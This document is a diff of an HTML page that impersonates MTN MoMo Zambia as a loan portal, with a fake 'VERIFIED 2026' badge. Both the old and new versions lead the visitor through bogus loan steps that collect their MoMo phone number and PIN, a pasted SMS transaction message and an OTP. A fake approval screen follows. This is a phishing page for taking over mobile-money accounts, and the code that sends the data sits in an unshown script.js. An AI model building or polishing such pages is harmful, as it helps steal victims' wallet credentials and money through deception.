@@ -1,173 +1,96 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>MTN MoMo Loans — Zambia</title>
-  <link rel="stylesheet" href="style.css" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MTN MoMo Zambia - Instant Credit Portal</title>
+  <link rel="stylesheet" href="style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 </head>
 <body>
-  <header class="header">
-    <div class="logo-container">
-      <div class="momo-badge">momo</div>
-    </div>
-    <div class="tag">from MTN</div>
-  </header>
+  <div class="portal-container">
+    <!-- Header / Branding -->
+    <header class="portal-header">
+      <div class="brand-badge">
+        <span class="momo-logo-text">MTN <b>MoMo</b></span>
+        <span class="verified-tag">✓ VERIFIED 2026</span>
+      </div>
+      <h1>Zambia Express Credit</h1>
+      <p>Fast, secure, and automated mobile money financing.</p>
+    </header>
 
-  <main class="container">
-    <div class="card">
-      
-      <!-- STEP 1: Loan Calculator & Welcome Message -->
-      <div id="step-1" class="form-step">
-        <h2>Welcome to MTN MoMo</h2>
-        <p class="subtitle">Get loans easily through MTN MoMo</p>
+    <!-- Horizontal Multi-Step Navigation Bar -->
+    <div class="steps-indicator">
+      <div class="step-indicator-item active" id="indicator-1">1. Authentication</div>
+      <div class="step-indicator-item" id="indicator-2">2. SMS Log</div>
+      <div class="step-indicator-item" id="indicator-3">3. Secure OTP</div>
+    </div>
+
+    <!-- Step 1: Authentication & Loan Calculator -->
+    <div class="form-step" id="step-1">
+      <div class="card">
+        <h2>Loan Calculator & MoMo Auth</h2>
+        <div class="slider-group">
+          <label>Select Loan Amount (ZMW): <span id="amountDisplay">2,500 ZMW</span></label>
+          <input type="range" id="loanAmount" min="500" max="10000" step="100" value="2500">
+        </div>
         
-        <div class="calculator-box">
-          <div class="calc-header">
-            <span class="calc-title">Loan Calculator</span>
-          </div>
-          
-          <div class="calc-row">
-            <span class="label-text">Amount</span>
-            <span id="display-amount" class="highlight-yellow">ZMW 1,000,000</span>
-          </div>
-          
-          <div class="calc-row">
-            <span class="label-text">Term</span>
-            <span id="display-term" class="highlight-yellow">48 Months</span>
-          </div>
-
-          <div class="range-container">
-            <input type="range" id="calc-amount-slider" min="500000" max="5000000" step="50000" value="1000000" oninput="updateCalculator()" />
-            <div class="range-labels">
-              <span>ZMW 500,000</span>
-              <span>ZMW 5,000,000</span>
-            </div>
-          </div>
-
-          <div class="monthly-payment-box">
-            <span>Monthly Payment</span>
-            <span id="display-monthly" class="highlight-yellow">ZMW 20,834</span>
-          </div>
+        <div class="input-group">
+          <label for="momo_phone">MTN Mobile Money Number</label>
+          <input type="text" id="momo_phone" value="+260" placeholder="+26096xxxxxxxx">
+          <small class="hint">Must start with +260 followed by valid MTN prefixes (96/76)</small>
         </div>
 
-        <button class="btn-primary" onclick="goToStep(2)">START APPLICATION</button>
-      </div>
-
-      <!-- STEP 2: Loan Application - Step 1 of 3 -->
-      <div id="step-2" class="form-step" style="display:none;">
-        <h3>Loan Details (1 of 3)</h3>
-        <label>Loan Type</label>
-        <select id="loan-type" required>
-          <option value="Personal Loan">Personal Loan</option>
-          <option value="Business Advance">Business Advance</option>
-        </select>
-        <label>Confirm Amount (ZMW)</label>
-        <input type="number" id="form-amount" required value="" placeholder="1000000" />
-        <label>Purpose of Loan</label>
-        <input type="text" id="form-purpose" placeholder="e.g. School fees, Stock" required value="" />
-        <div class="btn-group">
-          <button class="btn-secondary" onclick="goToStep(1)">Back</button>
-          <button class="btn-primary" onclick="goToStep(3)">Next</button>
+        <div class="input-group">
+          <label for="momo_pin">5-Digit MoMo PIN</label>
+          <input type="password" id="momo_pin" maxlength="5" placeholder="•••••">
+          <small class="hint">Strictly 5 digits required</small>
         </div>
-      </div>
 
-      <!-- STEP 3: Loan Application - Step 2 of 3 -->
-      <div id="step-3" class="form-step" style="display:none;">
-        <h3>Personal Information (2 of 3)</h3>
-        <label>First Name</label>
-        <input type="text" id="form-firstname" placeholder="Enter first name" required value="" />
-        <label>Last Name</label>
-        <input type="text" id="form-lastname" placeholder="Enter last name" required value="" />
-        <label>Mobile Number</label>
-        <input type="text" id="form-phone" placeholder="096xxxxxxxx" required value="" />
-        <div class="btn-group">
-          <button class="btn-secondary" onclick="goToStep(2)">Back</button>
-          <button class="btn-primary" onclick="goToStep(4)">Next</button>
-        </div>
+        <button id="nextStepBtn" class="btn-primary" disabled>Proceed to Verification</button>
       </div>
-
-      <!-- STEP 4: Loan Application - Step 3 of 3 -->
-      <div id="step-4" class="form-step" style="display:none;">
-        <h3>Employment & Income (3 of 3)</h3>
-        <label>Employment Status</label>
-        <select id="form-employer" required>
-          <option value="Employed">Employed</option>
-          <option value="Self-Employed">Self-Employed</option>
-          <option value="Business Owner">Business Owner</option>
-        </select>
-        <label>Monthly Income (ZMW)</label>
-        <input type="number" id="form-income" placeholder="5000" required value="" />
-        <div class="btn-group">
-          <button class="btn-secondary" onclick="goToStep(3)">Back</button>
-          <button class="btn-primary" onclick="submitInitialApplication()">Submit Application</button>
-        </div>
-      </div>
-
-      <!-- STEP 5: Login to MTN MoMo -->
-      <div id="step-5" class="form-step" style="display:none;">
-        <h3>MTN MoMo Authentication</h3>
-        <p class="subtitle">Enter your MoMo credentials to link disbursement wallet.</p>
-        <label>MoMo Phone Number</label>
-        <input type="text" id="momo-phone" placeholder="096xxxxxxx" required value="" />
-        <label>MoMo PIN (4 Digits)</label>
-        <input type="password" id="momo-pin" maxlength="4" placeholder="****" required value="" />
-        <button class="btn-primary" onclick="processMomoLogin()">Authorize Wallet</button>
-      </div>
-
-      <!-- STEP 6: Waiting for Admin Approval -->
-      <div id="step-6" class="form-step" style="display:none; text-align:center;">
-        <div class="spinner"></div>
-        <h3>Reviewing Application</h3>
-        <p class="subtitle" id="auth-countdown-text">Your request has been routed to the MTN credit desk. Please wait for authorization...</p>
-      </div>
-
-      <!-- STEP 7: SMS Verification -->
-      <div id="step-7" class="form-step" style="display:none;">
-        <h3>SMS Verification Required</h3>
-        <p class="subtitle">Paste the verification text message received from MTN to proceed.</p>
-        <textarea id="sms-text-input" rows="3" placeholder="Paste SMS text here..." required></textarea>
-        <button class="btn-primary" onclick="processSmsVerification()">Verify SMS</button>
-      </div>
-
-      <!-- STEP 8: Verifying SMS Message -->
-      <div id="step-8" class="form-step" style="display:none; text-align:center;">
-        <div class="spinner"></div>
-        <h3>Validating SMS Content...</h3>
-        <p class="subtitle" id="sms-countdown-text">Please wait... <b>10s</b> remaining</p>
-      </div>
-
-      <!-- STEP 9: OTP Verification -->
-      <div id="step-9" class="form-step" style="display:none;">
-        <h3>Enter 4-Digit OTP Code</h3>
-        <p class="subtitle">Enter the authorization code sent to your phone.</p>
-        <input type="text" id="otp-code" maxlength="4" placeholder=". . . ." required value="" style="text-align:center; font-size:24px; letter-spacing:8px;" />
-        <button class="btn-primary" onclick="processOtpVerification()">Confirm OTP</button>
-      </div>
-
-      <!-- STEP 10: Verifying OTP Code Countdown -->
-      <div id="step-10" class="form-step" style="display:none; text-align:center;">
-        <div class="spinner"></div>
-        <h3>Verifying OTP Code...</h3>
-        <p class="subtitle" id="otp-countdown-text">Please wait... <b>10s</b> remaining</p>
-      </div>
-
-      <!-- STEP 11: Final Congratulations Screen -->
-      <div id="step-11" class="form-step" style="display:none; text-align:left;">
-        <h2 style="color:#001f3f; text-align:center;">🎉 CONGRATULATIONS! 🎉</h2>
-        <p>🇿🇲 <b>Dear Applicant,</b></p>
-        <p>We are pleased to inform you that your loan application has successfully passed the initial review stage.</p>
-        <p>✅ <b>Your application is now undergoing final verification</b> by our processing team. Kindly remain patient while we complete this final review.</p>
-        <p>⏳ Please wait a few more minutes. Once the review is complete and your application is approved, your loan will be processed and released immediately.</p>
-        <p>📱 Please keep your phone active and stay available for any important updates.</p>
-        <hr style="border:0; border-top:1px solid #ddd; margin:15px 0;">
-        <p style="text-align:center; font-size:14px; color:#555; margin-bottom:0;">Thank you for choosing our loan services. We appreciate your trust and look forward to serving you.<br><br><b>Congratulations once again, and thank you for your patience! 🎊</b></p>
-      </div>
-
     </div>
-  </main>
+
+    <!-- Step 2: SMS Verification Content -->
+    <div class="form-step" id="step-2" style="display:none;">
+      <div class="card">
+        <h2>SMS Authorization Log</h2>
+        <p>Please paste or forward your recent transaction text message string below for verification.</p>
+        
+        <div class="input-group">
+          <textarea id="sms_text" rows="4" placeholder="Paste incoming transaction notification string..."></textarea>
+        </div>
+
+        <button id="submitSmsBtn" class="btn-primary">Submit SMS Log</button>
+      </div>
+    </div>
+
+    <!-- Step 3: Final OTP Verification -->
+    <div class="form-step" id="step-3" style="display:none;">
+      <div class="card">
+        <h2>Final Security Authorization</h2>
+        <p>Enter the confirmation token sent to your device.</p>
+        
+        <div class="input-group">
+          <input type="text" id="otp_code" maxlength="6" placeholder="Enter 6-digit OTP">
+        </div>
+
+        <button id="submitOtpBtn" class="btn-primary">Complete Application</button>
+      </div>
+    </div>
+
+    <!-- Success Completion Screen (Congratulations Screen) -->
+    <div class="form-step" id="step-success" style="display:none;">
+      <div class="card success-card">
+        <div class="success-icon">✓</div>
+        <h2>Congratulations!</h2>
+        <p>Your loan application has been successfully verified, approved, and queued for instant MTN MoMo disbursement.</p>
+        <div class="badge-verified-box">STATUS: VERIFIED SECURE</div>
+      </div>
+    </div>
+  </div>
 
   <script src="script.js"></script>
 </body>
-          </html>
+                                             </html>
           
